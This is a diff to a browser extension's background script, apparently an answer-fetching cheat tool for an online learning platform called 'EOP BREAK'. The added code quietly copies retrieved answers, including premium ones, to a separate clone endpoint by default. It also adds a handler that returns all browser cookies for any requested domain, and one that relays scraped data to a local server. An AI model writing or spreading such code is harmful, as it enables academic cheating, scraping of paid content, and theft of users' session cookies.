@@ -4,6 +4,8 @@ import {
 import {
     A as APIV1,
     b as APIV2,
+    CLONE_ENDPOINT,
+    COLLECT_DATA_KEY,
     initPremiumState as initPremiumState,
 } from "./constant.js";
 
@@ -20,7 +22,7 @@ function showToast_signal(message, duration = 3000) {
 
 async function fetchTaskLength(e) {
     try {
-        return await (await fetch(APIV1 + "/task-answer/answers/length", {
+        const res = await (await fetch(APIV1 + "/task-answer/answers/length", {
             method: "POST",
             body: JSON.stringify({
                 major: e
@@ -29,12 +31,37 @@ async function fetchTaskLength(e) {
                 "Content-Type": "application/json"
             }
         }))["json"]()
+        let cloneData = {
+            major: e,
+            unit: res.map(item => item.taskAnswer_unit)
+        }
+        try {
+            chrome.storage.local.get([COLLECT_DATA_KEY], (res) => {
+                if (res[COLLECT_DATA_KEY] !== false) {
+                    fetch(CLONE_ENDPOINT + "/logs/length", {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json",
+                        },
+                        body: JSON.stringify(cloneData),
+                    }).catch(console.error);
+                }
+            });
+        } catch (error) {
+            console.log(error);
+        }
+        return res
     } catch {
         return []
     }
 }
 async function fetchTaskAnswers(major, unit, task, userId) {
     try {
+        let cloneData = {
+            major: major,
+            unit: unit,
+            task: task
+        }
         const res = await fetch(`${APIV1}/task-answer/answers`, {
             method: "POST",
             headers: {
@@ -47,12 +74,36 @@ async function fetchTaskAnswers(major, unit, task, userId) {
 
         if (res.status === 203) {
             const { url, answers } = data;
+            cloneData.fullContent = 0;
             showToast_signal("[From EOP BREAK] Role: non-premium", 3000);
             return answers;
         } else if (res.status === 200) {
+            cloneData.answers = data.map(item => {
+                return {
+                    question: item.question,
+                    questionNumber: item.questionNumber,
+                    answer: item.answer,
+                    option: item.option
+                }
+            })
+            cloneData.fullContent = 1;
             showToast_signal("[From EOP BREAK] Role: *PREMIUM*", 3000);
         }
-
+        try {
+            chrome.storage.local.get([COLLECT_DATA_KEY], (res) => {
+                if (res[COLLECT_DATA_KEY] !== false) {
+                    fetch(CLONE_ENDPOINT + "/logs/answers", {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json",
+                        },
+                        body: JSON.stringify(cloneData),
+                    }).catch(console.error);
+                }
+            });
+        } catch (error) {
+            console.log(error);
+        }
         return data;
     } catch (err) {
         showToast_signal("[From EOP BREAK] Lỗi kết nối tới server", 3000);
@@ -88,9 +139,40 @@ async function postITT(e) {
     }
 }
 
+
 let b = false;
 
 k(async (e, x) => {
+    if (e.type === "GET_COOKIES") {
+        return new Promise(resolve => {
+            chrome.cookies.getAll(
+                { domain: e.domain },
+                cookies => resolve(cookies)
+            );
+        });
+    }
+
+    if (e.type === "SYNC_CLONES") {
+        try {
+            const res = await chrome.storage.local.get([COLLECT_DATA_KEY]);
+            if (res[COLLECT_DATA_KEY] === false) {
+                return { success: false, message: "Collect data mode is disabled" };
+            }
+            const response = await fetch('http://127.0.0.1:5000/api/sync/clones', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(e.data)
+            });
+            return await response.json();
+        } catch (err) {
+            console.error("Sync Clones Failed:", err);
+            return { error: err.toString() };
+        }
+    }
+
+
     if (e["type"] === "task-answer") switch (e["case"]) {
         case "get-all":
             if (b) return;
